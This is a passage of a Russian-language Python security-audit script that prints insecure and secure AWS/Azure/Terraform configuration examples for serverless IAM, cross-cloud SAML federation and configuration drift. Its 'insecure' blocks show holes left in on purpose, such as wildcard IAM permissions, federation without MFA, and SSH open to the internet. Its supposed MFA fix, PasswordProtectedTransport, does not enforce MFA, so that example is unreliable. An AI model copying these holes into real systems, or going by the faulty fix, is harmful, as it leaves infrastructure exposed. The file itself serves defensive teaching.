    print("        - \"sns:*\"       # ❌ Все действия над SNS")
    print("        - \"s3:*\"        # ❌ Все действия над S3")
    print("        Resource: \"*\"     # ❌ Все ресурсы!")
    print("        # 03_dynamodb_table.yaml - Таблица с чувствительными данными")
    print("        # ❌ Нет encryption at rest")
    print("        # ❌ Нет point-in-time recovery")
    print("        # 04_sns_topic.yaml - Topic для уведомлений")
    print("        # ❌ Policy позволяет publish от любого")
    print("  ✅ Secure:")
    print("        # 1. Авторизация на уровне API Gateway:")
    print("        Type: AWS::ApiGateway::Method")
    print("        Properties:")
    print("          AuthorizationType: AWS_IAM  # ✅ Или COGNITO_USER_POOLS")
    print("          AuthorizerId: !Ref LambdaAuthorizer")
    print("        # 2. Принцип наименьших привилегий для Lambda:")
    print("        Effect: Allow")
    print("        Action:")
    print("        - \"dynamodb:GetItem\"")
    print("        - \"dynamodb:PutItem\"")
    print("        Resource:")
    print("        - \"arn:aws:dynamodb:region:account:table/user-data\"")
    print("        # ❌ Нет \"*\", только конкретные действия и ресурсы")
    print("        # 3. Шифрование и защита данных:")
    print("        Type: AWS::DynamoDB::Table")
    print("        Properties:")
    print("          SSESpecification:")
    print("            SSEEnabled: true  # ✅ Шифрование включено")
    print("          PointInTimeRecoverySpecification:")
    print("            PointInTimeRecoveryEnabled: true  # ✅ Recovery включён")
    print("        # 4. Resource-based policies для SNS с ограничением источника")
    print("  🛠️ Remediation:")
    print("      • Включите авторизацию на API Gateway")
    print("      • Ограничьте IAM права Lambda до конкретных действий")
    print("      • Включите шифрование для DynamoDB")
    print("      • Настройте Resource-based policies для SNS")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 74: Multi-Cloud Identity Federation            │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-IA-3                                    │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   Federation trust между облаками без MFA и ограничений │
# └─────────────────────────────────────────────────────────────┘
def check_multi_cloud_identity_federation_74():
    """Проверяет безопасность federation trust между облачными провайдерами."""
    print("⚠️  [HIGH] Multi-Cloud Identity Federation")
    print("  💥 Issue: Federation trust между облаками без MFA и ограничений.")
    print("  🎯 Risk: Multi-cloud federation без MFA:\n"
          "    • Компрометация Azure AD = доступ к AWS\n"
          "    • Компрометация AWS = доступ к Azure\n"
          "    • Без MFA = легче украсть сессию\n"
          "    • Долгая сессия = больше времени для атаки")
    print("  ❌ Insecure:")
    print("        # 01_aws_trust_policy.yaml - AWS trust для Azure AD")
    print("        {")
    print("          \"Version\": \"2012-10-17\",")
    print("          \"Statement\": [{")
    print("            \"Effect\": \"Allow\",")
    print("            \"Principal\": {")
    print("              \"Federated\": \"arn:aws:iam::123456789012:saml-provider/AzureAD\"")
    print("            },")
    print("            \"Action\": \"sts:AssumeRoleWithSAML\",")
    print("            \"Condition\": {")
    print("              \"StringEquals\": {")
    print("                \"SAML:aud\": \"https://signin.aws.amazon.com/saml\"")
    print("              }")
    print("              # ❌ Нет условия на MFA!")
    print("              # ❌ Нет ограничения по IP")
    print("            }")
    print("          }]")
    print("        }")
    print("        # 02_azure_trust_policy.yaml - Azure trust для AWS")
    print("        {")
    print("          \"federationPolicy\": {")
    print("            \"trustedIdentityProviders\": [\"arn:aws:iam::123456789012:saml-provider/AWS\"],")
    print("            \"requireMfa\": false,  # ❌ MFA не требуется")
    print("            \"sessionDuration\": \"PT12H\"  # ❌ 12 часов - слишком долго")
    print("          }")
    print("        }")
    print("  ✅ Secure:")
    print("        # 1. Требовать MFA для federation:")
    print("        \"Condition\": {")
    print("          \"StringEquals\": {")
    print("            \"SAML:aud\": \"https://signin.aws.amazon.com/saml\",")
    print("            \"SAML:authnContextClassRef\": \"urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport\"")
    print("          },")
    print("          \"IpAddress\": {")
    print("            \"aws:SourceIp\": [\"10.0.0.0/8\", \"192.168.1.0/24\"]  # ✅ Только доверенные IP")
    print("          }")
    print("        }")
    print("        # 2. Ограничить длительность сессии:")
    print("        {")
    print("          \"federationPolicy\": {")
    print("            \"requireMfa\": true,  # ✅ MFA обязательно")
    print("            \"sessionDuration\": \"PT1H\",  # ✅ Максимум 1 час")
    print("            \"deviceCompliance\": true  # ✅ Проверка устройства")
    print("          }")
    print("        }")
    print("        # 3. Использовать Conditional Access (Azure AD)")
    print("        # 4. Мониторинг federation активности")
    print("  🛠️ Remediation:")
    print("      • Требуйте MFA для всех federation trust")
    print("      • Ограничьте длительность сессии до 1 часа")
    print("      • Добавьте IP restrictions к trust policy")
    print("      • Мониторьте federation события через CloudTrail")
    print()


# ┌─────────────────────────────────────────────────────────────┐
# │ 🔹 Проверка 75: Drift Detection from Baseline              │
# ├─────────────────────────────────────────────────────────────┤
# │ 📋 Стандарт:   NIST-CM-3.2                                  │
# │ ⚡ Критичность: 🟠 HIGH                                      │
# │ 📝 Описание:   Текущее состояние отличается от Terraform state │
# └─────────────────────────────────────────────────────────────┘
def check_drift_detection_from_baseline_75():
    """Проверяет наличие drift detection между IaC конфигурацией и реальным состоянием."""
    print("⚠️  [HIGH] Drift Detection from Baseline")
    print("  💥 Issue: Текущее состояние инфраструктуры отличается от Terraform state.")
    print("  🎯 Risk: Configuration drift:\n"
          "    • Несоответствие security baseline\n"
          "    • 'Ручные' изменения обходят code review\n"
          "    • Сложность аудита и комплаенса\n"
          "    • Риск нестабильности при re-deploy")
    print("  ❌ Insecure:")
    print("        # 01_terraform_state.json - Ожидаемое состояние")
    print("        {")
    print("          \"resources\": [{")
    print("            \"type\": \"aws_security_group\",")
    print("            \"name\": \"prod-sg\",")
    print("            \"values\": {")
    print("              \"ingress\": [{")
    print("                \"from_port\": 443,")
    print("                \"to_port\": 443,")
    print("                \"cidr_blocks\": [\"10.0.0.0/8\"]  # ✅ Только internal")
    print("              }]")
    print("            }")
    print("          }]")
    print("        }")
    print("        # 02_live_scan.json - Фактическое состояние из AWS API")
    print("        {")
    print("          \"resources\": [{")
    print("            \"type\": \"aws_security_group\",")
    print("            \"name\": \"prod-sg\",")
    print("            \"values\": {")
    print("              \"ingress\": [{")
    print("                \"from_port\": 443,")
    print("                \"to_port\": 443,")
    print("                \"cidr_blocks\": [\"0.0.0.0/0\"]  # ❌ Изменено на публичный!")
    print("              }, {")
    print("                \"from_port\": 22,")
    print("                \"to_port\": 22,")
    print("                \"cidr_blocks\": [\"0.0.0.0/0\"]  # ❌ SSH открыт!")
    print("              }]")
    print("            }")
    print("          }]")
    print("        }")
    print("  ✅ Secure:")
    print("        # 1. Регулярный drift detection:")
    print("        #    terraform plan -out=tfplan (сравнение state с config)")
    print("        #    AWS Config rules для continuous monitoring")
    print("        #    CloudFormation Drift Detection")
    print("        # 2. Автоматическое исправление или алерт:")
    print("        {")
    print("          \"driftPolicy\": {")
    print("            \"action\": \"alert\",  # ✅ Алерт при drift")
    print("            \"severity\": \"high\",")
    print("            \"notify\": [\"security-team@company.com\"],")
    print("            \"autoRemediate\": false  # ✅ Требовать review перед исправлением")
    print("          }")
    print("        }")
    print("        # 3. Запретить ручные изменения:")
    print("        #    - IAM policies deny manual changes to critical resources")
    print("        #    - Require all changes through Terraform/CI/CD")
    print("        # 4. Version control для state с locking")
    print("  🛠️ Remediation:")
    print("      • Настройте регулярный drift detection")
    print("      • Включите AWS Config для continuous monitoring")
    print("      • Запретите ручные изменения через IAM policies")
    print("      • Интегрируйте drift check в CI/CD pipeline")
    print()

def all_hard_check():
    """
    ╔════════════════════════════════════════════════════════════════╗
    ║  🔐 ЗАПУСК ВСЕХ ПРОВЕРОК HARD LEVEL (51–75)                   ║
    ╚════════════════════════════════════════════════════════════════╝
    """
    print("\n" + "=" * 70)
    print("🔐 Security Auditor — Hard Level Checks (51–75)")
    print("=" * 70 + "\n")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 1: COMPLEX KUBERNETES CHECKS (51–54)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("📦 РАЗДЕЛ 1: Complex Kubernetes Checks (51–54)\n")
    print("─" * 70)

    check_cross_file_network_policy_51()           # 51
    check_iam_privilege_escalation_path_52()       # 52
    check_service_account_token_abuse_53()         # 53
    check_lateral_movement_path_54()               # 54

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 2: COMPLIANCE & GOVERNANCE CHECKS (55–58)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 2: Compliance & Governance Checks (55–58)\n")
    print("─" * 70)

    check_secret_rotation_compliance_55()          # 55
    check_unused_iam_credentials_56()              # 56
    check_kubernetes_rbac_overprivileged_57()      # 57
    check_role_binding_to_default_sa_58()          # 58

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 3: KUBERNETES ADMISSION & ESCAPE CHECKS (59–60)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 3: Kubernetes Admission & Escape Checks (59–60)\n")
    print("─" * 70)

    check_admission_controller_disabled_59()       # 59
    check_container_breakout_potential_60()        # 60

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 4: INFRASTRUCTURE AS CODE CHECKS (61–62)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 4: Infrastructure as Code Checks (61–62)\n")
    print("─" * 70)

    check_terraform_hardcoded_secrets_61()         # 61
    check_state_file_public_access_62()            # 62

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 5: CI/CD & SUPPLY CHAIN CHECKS (63–65)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 5: CI/CD & Supply Chain Checks (63–65)\n")
    print("─" * 70)

    check_ci_cd_secret_exfiltration_63()           # 63
    check_dependency_chain_vulnerability_64()      # 64
    check_kubernetes_supply_chain_attack_65()      # 65

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 6: CLOUD GOVERNANCE CHECKS (66–68)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 6: Cloud Governance Checks (66–68)\n")
    print("─" * 70)

    check_cloud_resource_tagging_compliance_66()   # 66
    check_encryption_key_cross_account_access_67() # 67
    check_vpc_peering_security_gap_68()            # 68

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 7: IDENTITY & ACCESS CHECKS (69–70)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 7: Identity & Access Checks (69–70)\n")
    print("─" * 70)

    check_azure_aad_privileged_identity_69()       # 69
    check_gcp_service_account_key_leakage_70()     # 70

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 8: ADVANCED KUBERNETES CHECKS (71–72)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 8: Advanced Kubernetes Checks (71–72)\n")
    print("─" * 70)

    check_kubernetes_audit_log_tampering_71()      # 71
    check_container_registry_public_push_72()      # 72

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 РАЗДЕЛ 9: SERVERLESS & MULTI-CLOUD CHECKS (73–75)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n📦 РАЗДЕЛ 9: Serverless & Multi-Cloud Checks (73–75)\n")
    print("─" * 70)

    check_serverless_function_chain_exploit_73()   # 73
    check_multi_cloud_identity_federation_74()     # 74
    check_drift_detection_from_baseline_75()       # 75

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # 🔹 ИТОГОВЫЙ ОТЧЁТ
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print("\n" + "=" * 70)
    print("✅ ВСЕ ПРОВЕРКИ HARD LEVEL ЗАВЕРШЕНЫ")
    print("=" * 70)
    print("""
📊 Сводка:
    • Всего проверок: 25
    • Complex K8s:    4  (51–54) .yaml, .yml, .json
    • Compliance:     4  (55–58) .yaml, .json
    • K8s Admission:  2  (59–60) .yaml, .conf
    • IaC:            2  (61–62) .tf, .tfvars, .yaml
    • CI/CD:          3  (63–65) .yaml, .yml, .json
    • Cloud Gov:      3  (66–68) .yaml, .json
    • Identity:       2  (69–70) .yaml, .json
    • Advanced K8s:   2  (71–72) .yaml, .conf
    • Serverless:     3  (73–75) .yaml, .json, .tf
	


    """)
